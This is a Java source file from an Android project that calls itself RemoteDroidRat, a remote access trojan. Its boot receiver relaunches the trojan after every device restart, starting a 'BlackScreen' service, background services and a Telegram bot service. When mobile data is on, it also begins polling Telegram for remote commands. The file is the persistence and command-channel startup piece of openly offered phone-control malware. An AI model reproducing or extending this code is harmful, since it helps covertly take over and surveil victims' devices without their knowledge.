package com.KaranKumar.RemoteDroidRat.broadcasts;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.KaranKumar.RemoteDroidRat.services.background;
import com.KaranKumar.RemoteDroidRat.services.myNotification;
import com.KaranKumar.RemoteDroidRat.telegramBot.TelegramBotService;

import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import com.KaranKumar.RemoteDroidRat.telegramBot.telegramBotCmd.TelegramBotCmdApi;
import com.KaranKumar.RemoteDroidRat.services.BlackScreen;

public class bootComplate extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
            // Your task to be executed after boot completion
            // You can start a service, launch an activity, etc.


			
			 Intent black = new Intent(context,  BlackScreen.class);
			 context.startService(black);
			 
			
			Intent serviceNotification = new Intent(context, myNotification.class);
			context.startService(serviceNotification);

			// Start your service here
			Intent serviceIntent = new Intent(context, background.class);
			context.startService(serviceIntent);

			Intent serviceBotApi = new Intent(context, TelegramBotService.class);
			context.startService(serviceBotApi);

			if (isNetworkConnected(context)) {

				TelegramBotCmdApi tCmd = new TelegramBotCmdApi(context);
				tCmd.startCheckingMessages();
			}
        }


	}

	private boolean isNetworkConnected(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mobileNetworkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        return mobileNetworkInfo != null && mobileNetworkInfo.isConnected();
    }

}
